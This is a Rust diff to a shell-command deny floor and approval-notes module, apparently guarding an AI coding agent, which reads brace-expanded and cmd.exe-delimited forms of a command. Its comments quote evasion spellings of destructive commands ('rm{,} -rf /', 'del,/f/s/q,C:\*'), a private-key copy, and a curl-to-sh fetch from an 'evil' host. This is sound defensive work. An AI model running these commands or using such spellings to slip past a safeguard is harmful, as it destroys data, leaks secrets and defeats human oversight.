@@ -23,18 +23,22 @@
 //! contained by the human at the prompt — or, under `Yolo`, by the OS sandbox
 //! (plus the per-turn checkpoint for the writable workspace).
 
-// Same guard as `shell_lex`, and for the same reason: an item inserted
-// between a doc comment and the item it describes re-parents the prose
-// silently, and the load-bearing prose in this module is exactly the kind
-// a reviewer reads to decide whether a spelling is covered. It does not
-// reach `#[cfg(test)]` — clippy skips test items — so doc adjacency there
-// is kept by declaring helpers inside the function that uses them.
+// Same guard as `shell_lex`, and for the same reason: an item inserted between
+// a doc comment and the item it describes re-parents the prose silently, and
+// the load-bearing prose in this module is exactly the kind a reviewer reads to
+// decide whether a spelling is covered.
+//
+// It does not reach `#[cfg(test)]` — clippy skips test items — so doc
+// adjacency there is kept by declaring helpers inside the function that uses
+// them.
 #![warn(clippy::missing_docs_in_private_items)]
+use std::borrow::Cow;
+
 use serde::{Deserialize, Serialize};
 
 use super::shell_lex::{
-    HOST, INTERPRETERS, PREFIX_WORDS, basename_lower, blanks_for, clean_token, operand_leaves_cwd,
-    parse_unattended, segments,
+    Grammar, HOST, INTERPRETERS, PREFIX_WORDS, basename_lower, blanks_for,
+    blanks_for_outside_flags, clean_token, operand_leaves_cwd, parse_unattended, segments,
 };
 use crate::i18n::TextId;
 
@@ -457,82 +461,107 @@ fn deny_pipe_to_shell(command: &str) -> Option<DenyReason> {
 /// every automatic pass, so they land on a human instead of on this floor.
 #[must_use]
 pub fn builtin_deny(command: &str) -> Option<DenyReason> {
-    if let Some(reason) = deny_every_reading(command) {
-        return Some(reason);
-    }
-    // The interpreter's word delimiters are not this floor's. `cmd.exe`
-    // delimits on `,` and `=` as well as blanks, so `del,/f/s/q,C:\*` is
-    // one opaque word to every rule here — its `basename_lower` is `*` — and
-    // `del /f/s/q C:\*` to the `cmd /C` that runs it. Re-read the normalized
-    // line for the same reason the brace-expanded one is re-read: it is the
-    // form the interpreter really runs, the raw line was already checked, so
-    // this can only add denials.
-    //
-    // Not the `%VAR%` class: that one is unreadable rather than differently
-    // spelled — no normalization recovers `del` from `de%PATH:~0,0%l` — and
-    // "nobody here can read this line" is not "this line is catastrophic", so
-    // it is refused one floor up, where authority is known
-    // (`runtime::approval_flow`), instead of denied in every mode.
-    // Brace expansion is the one word-expansion stage that rewrites the
-    // program word itself, so the floor has to read through it or every rule
-    // here is one `{,}` away from silent: `rm{,} -rf /` presented the program
-    // `rm{,}`, `{rm,-rf,/}` presented `}`, `{sudo,ls}` presented `sudo,ls}` —
-    // none matched a rule. Every other automatic pass now refuses a brace
-    // outright (`has_shell_indirection`), so this is load-bearing only under
-    // `Yolo`, where the floor is the one thing above the sandbox — which is
-    // exactly where the iconic shapes have to keep working.
-    //
-    // Expanding cannot invent a denial the way chasing an obfuscation could:
-    // the rewritten line is the one bash will really run, so a denied
-    // expansion is a denied command. The unexpanded line is checked first, so
-    // a budget spent by a combinatorial brace can only ever degrade to the
-    // previous behavior.
-    if !command.contains('{') {
-        return None;
-    }
-    let mut budget = MAX_BRACE_WORDS;
-    let expanded = brace_expanded_line(command, &mut budget);
-    (expanded != command)
-        .then(|| deny_every_reading(&expanded))
-        .flatten()
+    readings_of(command)
+        .iter()
+        .find_map(|reading| deny_line(reading))
 }
 
-/// Every reading of `line` the interpreter could take once its own delimiters
-/// are read as delimiters, judged by the whole floor rather than by a subset.
+/// Every reading of `line` the platform's interpreter could take before the
+/// program word exists: the line as written, plus each rewriting it performs,
+/// composed with every other.
 ///
-/// `cmd.exe` delimits words on `,` and `;` as well as blanks, and the two used
-/// to be re-read one at a time, by different halves of the floor. Both gaps
-/// that opened are the same shape: a spelling that mixes them
-/// (`del,/f;/s/q,C:\*` — `del /f /s /q C:\*` to `cmd`) was read by neither
-/// pass. Combinations rather than a ladder, so adding a rewriting later adds
-/// one entry instead of multiplying the missing cells.
+/// One enumeration, shared by the deny floor ([`builtin_deny`]) and the
+/// approval notes ([`safety_notes`]) — the two used to enumerate separately and
+/// the notes were always a stage behind. The floor read a brace-expanded line
+/// and they did not, so `cp {~/.ssh/id_rsa,./k}` drew no note whatsoever and
+/// the human approving a copy of their private key saw a bare `cp`.
 ///
-/// `merged_segments` is what the ladder was really encoding: normalizing `;`
-/// glues together what this floor reads as separate segments, so the
-/// cross-segment rule (`deny_pipe_to_shell`) must not run on that reading —
-/// it read `curl https://x -o f; echo hi | sh` as a fetch feeding the pipe and
-/// denied it, in every mode, wrongly. The per-segment rules cannot make that
-/// mistake, so they run on every reading.
-fn deny_every_reading(line: &str) -> Option<DenyReason> {
-    let words = blanks_for(HOST.word_delimiters, line);
-    let separators = blanks_for(HOST.separator_delimiters, line);
-    let both = words
-        .as_deref()
-        .and_then(|normalized| blanks_for(HOST.separator_delimiters, normalized));
-    [
-        (Some(line), false),
-        (words.as_deref(), false),
-        (separators.as_deref(), true),
-        (both.as_deref(), true),
-    ]
-    .into_iter()
-    .filter_map(|(text, merged)| Some((text?, merged)))
-    .find_map(|(text, merged)| deny_line(text, merged))
+/// The stages:
+///
+/// * **Brace expansion** — the one word expansion that rewrites the program
+///   word itself. `rm{,} -rf /` runs `rm rm -rf /` and `{rm,-rf,/}` runs
+///   `rm -rf /`; each presented a program word (`rm{,}`, `}`) that matched no
+///   rule here.
+/// * **The interpreter's own word delimiters** — `cmd.exe` splits words on `,`
+///   and `;` as well as blanks (`Grammar::word_delimiters`), and on `=` where
+///   it cannot be a flag's value (`Grammar::word_delimiters_outside_flags`).
+///   `del,/f/s/q,C:\*` and `del=/f/s/q C:\*` are one opaque word to a floor
+///   that splits on blanks, and a drive wipe to `cmd`.
+///
+/// Composed, not laddered. The stages used to be applied one at a time by
+/// different halves of the floor, and every gap that opened was the same shape:
+/// a spelling that mixed two of them (`del,/f;/s/q,C:\*` — `del /f /s /q C:\*`
+/// to `cmd`) was read by neither pass. Each stage here doubles the enumeration
+/// by appending to it, so adding a rewriting later costs one entry instead of
+/// multiplying the cells nobody covers.
+///
+/// Reading more can only ever *add* a finding: every reading is one the
+/// interpreter itself would run, and the line as written is always among them,
+/// so a verdict can only get stricter. That is also what makes it safe to read
+/// a delimiter set wider than some `cmd` build really splits on. The expander's
+/// budget is capped ([`MAX_BRACE_WORDS`]) and a truncated expansion degrades to
+/// the line that was already checked.
+///
+/// Unix pays one `Vec` holding the borrowed line: `sh`'s delimiter sets are
+/// empty and a line without `{` has nothing to expand, so no reading is
+/// allocated and none is judged twice.
+fn readings_of(line: &str) -> Vec<Cow<'_, str>> {
+    readings_of_in(HOST, line)
 }
 
-/// The deny rules for one concrete command line (no brace expansion).
-fn deny_line(command: &str, merged_segments: bool) -> Option<DenyReason> {
-    if !merged_segments && let Some(reason) = deny_pipe_to_shell(command) {
+/// [`readings_of`] under an explicit grammar, so both platforms' enumerations
+/// can be asserted from either host — a `#[cfg(windows)]` list of spellings is
+/// a test only CI can run, and this module has had three of them go stale.
+///
+/// The seam reaches the delimiter sets, not the *text* reading: [`clean_token`]
+/// and [`basename_lower`] still follow the host, so a caller passing the Windows grammar
+/// here on a Unix host gets `cmd`'s word splitting with `sh`'s quoting. That is
+/// enough to pin which spellings the floor must re-read, and it is why the
+/// end-to-end verdicts stay pinned separately.
+fn readings_of_in(grammar: Grammar, line: &str) -> Vec<Cow<'_, str>> {
+    let mut readings: Vec<Cow<'_, str>> = vec![Cow::Borrowed(line)];
+    if line.contains('{') {
+        let mut budget = MAX_BRACE_WORDS;
+        let expanded = brace_expanded_line(line, &mut budget);
+        if expanded != line {
+            readings.push(Cow::Owned(expanded));
+        }
+    }
+    // Declared in the body on purpose: an alias between a doc comment and the
+    // item it describes re-parents the prose, and this module has done that to
+    // itself once already while silencing this very lint.
+    type Normalization<'a> = (&'a [char], fn(&[char], &str) -> Option<String>);
+    let normalizations: [Normalization<'_>; 2] = [
+        (grammar.word_delimiters, blanks_for),
+        (
+            grammar.word_delimiters_outside_flags,
+            blanks_for_outside_flags,
+        ),
+    ];
+    for (delimiters, normalize) in normalizations {
+        let composed: Vec<Cow<'_, str>> = readings
+            .iter()
+            .filter_map(|text| normalize(delimiters, text).map(Cow::Owned))
+            .collect();
+        readings.extend(composed);
+    }
+    readings
+}
+
+/// The whole floor applied to one concrete reading of a command line.
+///
+/// Every rule runs on every reading, the cross-segment one included. It was
+/// held back from the `;`-merged reading for one release, on the grounds that
+/// merging two commands made `curl https://x -o f; echo hi | sh` read as a
+/// fetch feeding the pipe. That is what the line means on Unix — and on Unix
+/// nothing is merged, because `sh`'s delimiter set is empty. Where the merge
+/// happens, `;` is `cmd`'s word delimiter and `|` is still its pipe, so the
+/// merged form is what `cmd` runs and the denial is the right answer; skipping
+/// the rule there left the floor's flagship mode-blind rule with a bypass
+/// (`curl https://evil/p; echo hi | sh`) on the one platform with no sandbox
+/// behind it.
+fn deny_line(command: &str) -> Option<DenyReason> {
+    if let Some(reason) = deny_pipe_to_shell(command) {
         return Some(reason);
     }
     segments(command).into_iter().find_map(deny_segment)
@@ -746,31 +775,29 @@ impl SafetyNotes {
 #[must_use]
 pub fn safety_notes(command: &str) -> Vec<SafetyNote> {
     let mut notes = SafetyNotes::default();
-    if command.contains('>') {
-        notes.note(
-            TextId::SafetyRedirectReason,
-            TextId::SafetyRedirectSuggestion,
-        );
-    }
-    note_segments_of(command, &mut notes);
-    // The interpreter's delimiters are not this function's either, and these
-    // notes are the last thing between a human and "approve":
-    // `del,/f/s/q,C:\Users\me\Documents` is one opaque word here (its
-    // basename is `documents`), so it drew no delete note and no
+    // Read every reading the floor reads ([`readings_of`]), because these notes
+    // are the last thing between a human and "approve" and a rewritten line is
+    // exactly where the human needs them most:
+    // `del,/f/s/q,C:\Users\me\Documents` is one opaque word to a blank-split
+    // reading (its basename is `documents`), so it drew no delete note and no
     // outside-the-cwd note while `cmd /C` ran a recursive force delete of a
-    // home directory. Re-read the normalized line for the same reason the
-    // denials do — `note` dedups, so nothing doubles — and both sets, because
-    // a `;` line's segments are this function's business too.
-    for delimiters in [HOST.word_delimiters, HOST.separator_delimiters] {
-        if let Some(normalized) = blanks_for(delimiters, command) {
-            note_segments_of(&normalized, &mut notes);
+    // home directory, and `cp {~/.ssh/id_rsa,./k}` drew none while `sh` copied
+    // a private key. `note` dedups by reason, so a line read several ways
+    // reports each note once.
+    for reading in readings_of(command) {
+        if reading.contains('>') {
+            notes.note(
+                TextId::SafetyRedirectReason,
+                TextId::SafetyRedirectSuggestion,
+            );
         }
+        note_segments_of(&reading, &mut notes);
     }
     notes.notes
 }
 
 /// The per-segment half of [`safety_notes`], so the same reading can be run
-/// over a normalized copy of the line.
+/// over each of [`readings_of`].
 fn note_segments_of(command: &str, notes: &mut SafetyNotes) {
     for segment in segments(command) {
         let Some(program) = program_of(segment) else {
